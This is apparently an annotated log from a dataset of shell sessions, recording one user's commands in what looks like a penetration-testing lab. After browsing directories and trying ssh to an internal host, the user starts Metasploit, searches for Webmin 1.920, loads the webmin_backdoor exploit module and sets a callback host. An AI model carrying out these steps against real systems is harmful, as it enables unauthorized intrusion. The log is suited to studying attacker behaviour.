User 69 start time 1594798272 end 1594805357
PADDING
PADDING
PADDING
INPUT|69--0|A10 |1594798272|69|ls|OUTPUT
INPUT|69--1|U|1594798277|69|cd ..|OUTPUT
INPUT|69--2|A10 |1594798279|69|ls|OUTPUT
INPUT|69--3|U|1594798297|69|cd etc|OUTPUT
INPUT|69--4|A10 |1594798300|69|ls|OUTPUT
INPUT|69--5|U|1594798306|69|cd ...|OUTPUT
INPUT|69--6|U|1594798310|69|cd ..|OUTPUT
INPUT|69--7|A10 |1594798311|69|ls|OUTPUT
INPUT|69--8|U|1594798315|69|cd root|OUTPUT
INPUT|69--9|A10 |1594798317|69|ls|OUTPUT
INPUT|69--10|A16 |1594798488|69|ssh 172.18.1.5 -p 10000|OUTPUT
INPUT|69--11|A16 |1594798497|69|ssh 172.18.1.5|OUTPUT
INPUT|69--12|U|1594798647|69|metasploit|OUTPUT
INPUT|69--13|U|1594798938|69|metasploit|OUTPUT
INPUT|69--14|U|1594799099|69|service postgresql start|OUTPUT
INPUT|69--15|U|1594799342|69|msfsplayload|OUTPUT
INPUT|69--16|U|1594799363|69|msfplayload|OUTPUT
INPUT|69--17|U|1594799415|69|msf|OUTPUT
INPUT|69--18|M2 |1594799431|69|msfconsole|OUTPUT
INPUT|69--19|U|1594799506|69|cd ..|OUTPUT
INPUT|69--20|U|1594799529|69|cd home|OUTPUT
INPUT|69--21|U|1594799577|69|cd root|OUTPUT
INPUT|69--22|U|1594799595|69|cd debian|OUTPUT
INPUT|69--23|U|1594799603|69|cd|OUTPUT
INPUT|69--24|U|1594799619|69|cd ..|OUTPUT
INPUT|69--25|U|1594799635|69|exit|OUTPUT
INPUT|69--26|V2 |1594799638|69|msfconsole|OUTPUT
INPUT|69--27|U|1594799665|69|cd ..|OUTPUT
INPUT|69--28|U|1594799679|69|cd root|OUTPUT
INPUT|69--29|U|1594799724|69|info|OUTPUT
INPUT|69--30|A3 |1594799758|69|help search|OUTPUT
INPUT|69--31|A3 |1594799856|69|search 1.920|OUTPUT
INPUT|69--32|M8 |1594800035|69|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|69--33|M5 |1594800048|69|show options|OUTPUT
INPUT|69--34|A6 |1594800219|69|set vhost|OUTPUT
INPUT|69--35|A6 |1594800362|69|set lhost 10.1.135.83|OUTPUT
